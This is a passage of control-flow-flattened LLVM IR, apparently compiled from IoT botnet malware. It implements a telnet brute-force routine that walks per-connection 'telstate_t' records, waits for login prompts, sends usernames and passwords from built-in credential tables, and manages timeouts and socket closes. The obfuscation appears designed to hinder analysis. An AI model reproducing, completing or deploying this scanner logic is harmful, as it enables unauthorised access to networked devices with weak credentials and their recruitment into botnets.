  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 8
  %349 = load i8*, i8** %348, align 8
  call void @llvm.memset.p0i8.i64(i8* %349, i8 0, i64 1024, i32 1, i1 false)
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %.reload193 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload193, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 2
  store i8 2, i8* %353, align 8
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  store i32 86814159, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %3, align 4
  %357 = icmp eq i32 %356, -1
  %358 = select i1 %357, i32 1252639945, i32 1618923359
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load i32, i32* %2, align 4
  %361 = sext i32 %360 to i64
  %.reload192 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload192, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 0
  %364 = load i32, i32* %363, align 16
  %365 = call i32 @sclose(i32 %364)
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %.reload191 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload191, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 2
  store i8 0, i8* %369, align 8
  %370 = load i32, i32* %2, align 4
  %371 = sext i32 %370 to i64
  %.reload190 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload190, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 3
  store i8 1, i8* %373, align 1
  store i32 1618923359, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  store i32 86814159, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload189, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 6
  %380 = load i32, i32* %379, align 4
  %381 = add i32 %380, 10
  %382 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %383 = icmp ult i32 %381, %382
  %384 = select i1 %383, i32 1513056356, i32 -2037144685
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 0
  %390 = load i32, i32* %389, align 16
  %391 = call i32 @sclose(i32 %390)
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 2
  store i8 0, i8* %395, align 8
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 3
  store i8 1, i8* %399, align 1
  store i32 -2037144685, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i32, i32* %2, align 4
  %403 = sext i32 %402 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 6
  %406 = load i32, i32* %405, align 4
  %407 = icmp eq i32 %406, 0
  %408 = select i1 %407, i32 -1466844188, i32 2045856597
  store i32 %408, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 6
  store i32 %410, i32* %414, align 4
  store i32 2045856597, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 16
  %421 = load i32, i32* %2, align 4
  %422 = sext i32 %421 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 8
  %425 = load i8*, i8** %424, align 8
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 7
  %430 = load i16, i16* %429, align 16
  %431 = zext i16 %430 to i32
  %432 = call i32 @readUntil(i32 %420, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %425, i32 1024, i32 %431)
  %433 = icmp ne i32 %432, 0
  %434 = select i1 %433, i32 790164572, i32 -1074695367
  store i32 %434, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 6
  store i32 0, i32* %439, align 4
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 7
  store i16 0, i16* %443, align 16
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 8
  %448 = load i8*, i8** %447, align 8
  call void @llvm.memset.p0i8.i64(i8* %448, i8 0, i64 1024, i32 1, i1 false)
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 2
  store i8 3, i8* %452, align 8
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 8
  %458 = load i8*, i8** %457, align 8
  %459 = call i64 @strlen(i8* %458) #10
  %460 = trunc i64 %459 to i16
  %461 = load i32, i32* %2, align 4
  %462 = sext i32 %461 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 7
  store i16 %460, i16* %464, align 16
  store i32 1057079909, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 6
  %470 = load i32, i32* %469, align 4
  %471 = add i32 %470, 30
  %472 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %473 = icmp ult i32 %471, %472
  %474 = select i1 %473, i32 952287144, i32 1931673734
  store i32 %474, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 16
  %481 = call i32 @sclose(i32 %480)
  %482 = load i32, i32* %2, align 4
  %483 = sext i32 %482 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 2
  store i8 0, i8* %485, align 8
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 3
  store i8 1, i8* %489, align 1
  store i32 1931673734, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 0
  %496 = load i32, i32* %495, align 16
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 4
  %501 = load i8, i8* %500, align 2
  %502 = zext i8 %501 to i64
  %503 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %502
  %504 = load i8*, i8** %503, align 8
  %505 = load i32, i32* %2, align 4
  %506 = sext i32 %505 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 4
  %509 = load i8, i8* %508, align 2
  %510 = zext i8 %509 to i64
  %511 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %510
  %512 = load i8*, i8** %511, align 8
  %513 = call i64 @strlen(i8* %512) #10
  %514 = call i64 @send(i32 %496, i8* %504, i64 %513, i32 16384)
  %515 = icmp slt i64 %514, 0
  %516 = select i1 %515, i32 688673511, i32 -1740667487
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 0
  %522 = load i32, i32* %521, align 16
  %523 = call i32 @sclose(i32 %522)
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 2
  store i8 0, i8* %527, align 8
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 3
  store i8 1, i8* %531, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 16
  %538 = call i64 @send(i32 %537, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %539 = icmp slt i64 %538, 0
  %540 = select i1 %539, i32 722088242, i32 -1455244456
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 0
  %546 = load i32, i32* %545, align 16
  %547 = call i32 @sclose(i32 %546)
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 2
  store i8 0, i8* %551, align 8
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 3
  store i8 1, i8* %555, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 2
  store i8 4, i8* %560, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i32, i32* %2, align 4
  %563 = sext i32 %562 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %563
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %564, i32 0, i32 6
  %566 = load i32, i32* %565, align 4
  %567 = icmp eq i32 %566, 0
  %568 = select i1 %567, i32 1283797482, i32 1161014227
  store i32 %568, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %571 = load i32, i32* %2, align 4
  %572 = sext i32 %571 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 6
  store i32 %570, i32* %574, align 4
  store i32 1161014227, i32* %switchVar
  br label %loopEnd

; <label>:575:                                    ; preds = %loopEntry
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 0
  %580 = load i32, i32* %579, align 16
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 8
  %585 = load i8*, i8** %584, align 8
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 7
  %590 = load i16, i16* %589, align 16
  %591 = zext i16 %590 to i32
  %592 = call i32 @readUntil(i32 %580, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %585, i32 1024, i32 %591)
  %593 = icmp ne i32 %592, 0
  %594 = select i1 %593, i32 -751131883, i32 1082040216
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  %596 = load i32, i32* %2, align 4
  %597 = sext i32 %596 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 6
  store i32 0, i32* %599, align 4
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 7
  store i16 0, i16* %603, align 16
  %604 = load i32, i32* %2, align 4
  %605 = sext i32 %604 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 8
  %608 = load i8*, i8** %607, align 8
  %609 = call i8* @strstr(i8* %608, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %610 = icmp ne i8* %609, null
  %611 = select i1 %610, i32 -955629301, i32 -879034693
  store i32 %611, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i32, i32* %2, align 4
  %614 = sext i32 %613 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 2
  store i8 5, i8* %616, align 8
  store i32 324426246, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 2
  store i8 100, i8* %621, align 8
  store i32 324426246, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 8
  %627 = load i8*, i8** %626, align 8
  call void @llvm.memset.p0i8.i64(i8* %627, i8 0, i64 1024, i32 1, i1 false)
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 8
  %633 = load i8*, i8** %632, align 8
  %634 = call i8* @strstr(i8* %633, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %635 = icmp ne i8* %634, null
  %636 = select i1 %635, i32 -1298627546, i32 1635320090
  store i32 %636, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 16
  %643 = call i32 @sclose(i32 %642)
  %644 = load i32, i32* %2, align 4
  %645 = sext i32 %644 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 2
  store i8 0, i8* %647, align 8
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 3
  store i8 0, i8* %651, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  %653 = load i32, i32* %2, align 4
  %654 = sext i32 %653 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 8
  %657 = load i8*, i8** %656, align 8
  %658 = call i64 @strlen(i8* %657) #10
  %659 = trunc i64 %658 to i16
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 7
  store i16 %659, i16* %663, align 16
  store i32 -996646825, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 6
  %669 = load i32, i32* %668, align 4
  %670 = add i32 %669, 30
  %671 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %672 = icmp ult i32 %670, %671
  %673 = select i1 %672, i32 -661449443, i32 -1299783571
  store i32 %673, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  %675 = load i32, i32* %2, align 4
  %676 = sext i32 %675 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 16
  %680 = call i32 @sclose(i32 %679)
  %681 = load i32, i32* %2, align 4
  %682 = sext i32 %681 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 2
  store i8 0, i8* %684, align 8
  %685 = load i32, i32* %2, align 4
  %686 = sext i32 %685 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 3
  store i8 1, i8* %688, align 1
  store i32 -1299783571, i32* %switchVar
  br label %loopEnd

; <label>:689:                                    ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 0
  %695 = load i32, i32* %694, align 16
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 5
  %700 = load i8, i8* %699, align 1
  %701 = zext i8 %700 to i64
  %702 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %701
  %703 = load i8*, i8** %702, align 8
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 5
  %708 = load i8, i8* %707, align 1
  %709 = zext i8 %708 to i64
  %710 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %709
  %711 = load i8*, i8** %710, align 8
  %712 = call i64 @strlen(i8* %711) #10
  %713 = call i64 @send(i32 %695, i8* %703, i64 %712, i32 16384)
  %714 = icmp slt i64 %713, 0
  %715 = select i1 %714, i32 1040198452, i32 856951804
  store i32 %715, i32* %switchVar
  br label %loopEnd

; <label>:716:                                    ; preds = %loopEntry
